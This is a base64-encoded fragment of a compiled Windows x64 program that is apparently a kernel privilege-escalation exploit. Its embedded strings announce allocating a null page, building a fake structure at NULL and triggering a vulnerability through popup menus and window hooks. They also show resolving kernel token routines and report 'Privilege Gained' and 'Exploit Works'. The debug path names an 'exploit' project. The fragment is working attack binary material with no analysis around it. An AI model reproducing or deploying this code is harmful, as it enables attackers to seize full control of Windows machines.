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ZXF1ZXN0aW5nIGtlcm5lbCBtb2R1bGVzIHRocm91Z2ggWndRdWVyeVN5c3RlbUluZm9ybWF0aW9uIGZhaWxlZAAAAFsqXSBQYXJzaW5nIFNZU1RFTV9JTkZPLi4uAAAAAAAAWypdICVkIEtlcm5lbCBtb2R1bGVzIGZvdW5kAAAAAABbKl0gQ2hlY2tpbmcgbW9kdWxlICVzAAAuZXhlAAAAAG50AAAAAAAAWypdIEdvb2QhIG50IGZvdW5kIGFzICVzIGF0IDB4JTA4eAAAAAAAAFsqXSAlcyBsb2FkZWQgaW4gdXNlcnNwYWNlIGF0OiAlMDh4AAAAAABQc0xvb2t1cFByb2Nlc3NCeVByb2Nlc3NJZAAAAAAAAFshXSBGYWlsZWQgdG8gc29sdmUgUHNMb29rdXBQcm9jZXNzQnlQcm9jZXNzSWQAAFsqXSBwUHNMb29rdXBQcm9jZXNzQnlQcm9jZXNzSWQgaW4ga2VybmVsOiAweCVwAFBzUmVmZXJlbmNlUHJpbWFyeVRva2VuAFsqXSBwUHNSZWZlcmVuY2VQcmltYXJ5VG9rZW4gaW4ga2VybmVsOiAweCVwAAAAAFsqXSBSZWdpc3RlcmluZyBjbGFzcy4uLgAAAAAAAAAAd29xdW5pbWFsZWdlYmkAAFshXSBSZWdpc3RlckNsYXNzQSBmYWlsZWQgAAAAAAAAWypdIENyZWF0aW5nIHdpbmRvdy4uLgAAWyFdIENyZWF0ZVdpbmRvd0V4QSBmYWlsZWQAAAAAAABbKl0gQWxsb2NhdGluZyBudWxsIHBhZ2UuLi4AAAAAAFshXSBGYWlsZWQgdG8gYWxsb2NhdGUgbnVsbCBwYWdlAAAAAAAAAABbKl0gR2V0dGluZyBQdGlDdXJyZW50Li4uAAAAAAAAAHVzZXIzMi5kbGwAAAAAAABnZGkzMi5kbGwAAAAAAAAAWyFdIEZpbGVkIHRvIGdldCBjdXJyZW50IHRocmVhZCBpbmZvcm1hdGlvbgAAAAAAWypdIEdvb2QhIGR3VGhyZWFkSW5mb1B0ciAweCVwAABbKl0gQ3JlYXRpbmcgYSBmYWtlIHN0cnVjdHVyZSBhdCBOVUxMLi4uAAAAAAAAAABbKl0gVHJpZ2dlcmluZyB2dWxuZXJhYmlsaXR5Li4uAFshXSBGaXJzdCBDcmVhdGVQ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XQEAAAAAAAAAAAAAAAAAjFkBAAAAAAB6WQEAAAAAAGhZAQAAAAAAVFkBAAAAAABCWQEAAAAAADBZAQAAAAAAHFkBAAAAAAAKWQEAAAAAAPZYAQAAAAAA5lgBAAAAAADcWAEAAAAAAM5YAQAAAAAAvFgBAAAAAAAAAAAAAAAAAA8CR2V0Q3VycmVudFByb2Nlc3MApAJHZXRQcm9jQWRkcmVzcwAAqANMb2FkTGlicmFyeUEAALEDTG9jYWxBbGxvYwAA/ANPdXRwdXREZWJ1Z1N0cmluZ0EAABQCR2V0Q3VycmVudFRocmVhZElkAAAQAkdldEN1cnJlbnRQcm9jZXNzSWQAS0VSTkVMMzIuZGxsAACLAlJlZ2lzdGVyQ2xhc3NBAACrAERlc3Ryb3lNZW51AOgARW5kTWVudQBzAlBvc3RNZXNzYWdlQQAAEwNTZXRXaW5kb3dMb25nUHRyQQBuAENyZWF0ZVBvcHVwTWVudQAfA1NldFdpbmRvd3NIb29rRXhBAKAARGVmV2luZG93UHJvY0EAAHAAQ3JlYXRlV2luZG93RXhBAEoDVW5ob29rV2luZG93c0hvb2sAHABDYWxsTmV4dEhvb2tFeAAAQQNUcmFja1BvcHVwTWVudQAA7QFJbnNlcnRNZW51SXRlbUEAVVNFUjMyLmRsbAAAzgFHZXRDb21tYW5kTGluZUEAagNJc0RlYnVnZ2VyUHJlc2VudABwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAJQFFbmNvZGVQb2ludGVyAP8ARGVjb2RlUG9pbnRlcgApAUVudGVyQ3JpdGljYWxTZWN0aW9uAAClA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAC7BFJ0bFVud2luZEV4AFYCR2V0TGFzdEVycm9yAAAZBVNldExhc3RFcnJvcgAAVwFFeGl0UHJvY2VzcwBsAkdldE1vZHVsZUhhbmRsZUV4VwAA1ANNdWx0aUJ5dGVUb1dpZGVDaGFyAN0FV2lkZUNoYXJUb011bHRpQnl0ZQCpAkdldFByb2Nlc3NIZWFwAADHAkdldFN0ZEhhbmRsZQAARQJHZXRGaWxlVHlwZQAGAURlbGV0ZUNyaXRpY2FsU2VjdGlvbgDFAkdldFN0YXJ0dXBJbmZvVwBoAkdldE1vZHVsZUZpbGVOYW1lQQAA8QVXcml0ZUZpbGUAaQJHZXRNb2R1bGVGaWxlTmFtZVcAADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIA3QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQAuAkdldEVudmlyb25tZW50U3RyaW5nc1cAAKMBRnJlZUVudmlyb25tZW50U3RyaW5nc1cArgRSdGxDYXB0dXJlQ29udGV4dAC1BFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAALwEUnRsVmlydHVhbFVud2luZAAAkgVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAFIFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAFEDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudABhBVNsZWVwAHAFVGVybWluYXRlUHJvY2VzcwAAggVUbHNBbGxvYwAAhAVUbHNHZXRWYWx1ZQCFBVRsc1NldFZhbHVlAIMFVGxzRnJlZQBtAkdldE1vZHVsZUhhbmRsZVcAAOIBR2V0Q29uc29sZUNQAAD0AUdldENvbnNvbGVNb2RlAAAMBVNldEZpbGVQb2ludGVyRXgAAHUDSXNWYWxpZENvZGVQYWdlAKoBR2V0QUNQAACNAkdldE9FTUNQAAC5AUdldENQSW5mbwA8A0hlYXBGcmVlAACqA0xvYWRMaWJyYXJ5RXhXAAD9A091dHB1dERlYnVnU3RyaW5nVwAAMAVTZXRTdGRIYW5kbGUAAPAFV3JpdGVDb25zb2xlVwDMAkdldFN0cmluZ1R5cGVXAAA4A0hlYXBBbGxvYwA/A0hlYXBSZUFsbG9jAJgBRmx1c2hGaWxlQnVmZmVycwAAQQNIZWFwU2l6ZQAAmQNMQ01hcFN0cmluZ1cAAMIAQ3JlYXRlRmlsZVcAfwBDbG9zZUhhbmRsZQAAAAAAAAAAAAAAAAAAAAAAMqLfLZkrAADNXSDSZtT//wEAAAACAAAAWPMAQAEAAABg8wBAAQAAAAAAAAAAAAAAAQAAABYAAAACAAAAAgAAAAMAAAACAAAABAAAABgAAAAFAAAADQAAAAYAAAAJAAAABwAAAAwAAAAIAAAADAAAAAkAAAAMAAAACgAAAAcAAAALAAAACAAAAAwAAAAWAAAADQAAABYAAAAPAAAAAgAAABAAAAANAAAAEQAAABIAAAASAAAAAgAAACEAAAANAAAANQAAAAIAAABBAAAADQAAAEMAAAACAAAAUAAAABEAAABSAAAADQAAAFMAAAANAAAAVwAAABYAAABZAAAACwAAAGwAAAANAAAAbQAAACAAAABwAAAAHAAAAHIAAAAJAAAABgAAABYAAACAAAAACgAAAIEAAAAKAAAAggAAAAkAAACDAAAAFgAAAIQAAAANAAAAkQAAACkAAACeAAAADQAAAKEAAAACAAAApAAAAAsAAACnAAAADQAAALcAAAARAAAAzgAAAAIAAADXAAAACwAAABgHAAAMAAAADAAAAAgAAADgiQFAAQAAAAAAAAAAAAAA4IkBQAEAAAABAQAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAA//////////+ACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAAAAAAAAAgICAgICAgICAgICAgICAgICAgICAgICAgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6AAAAAAAAQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA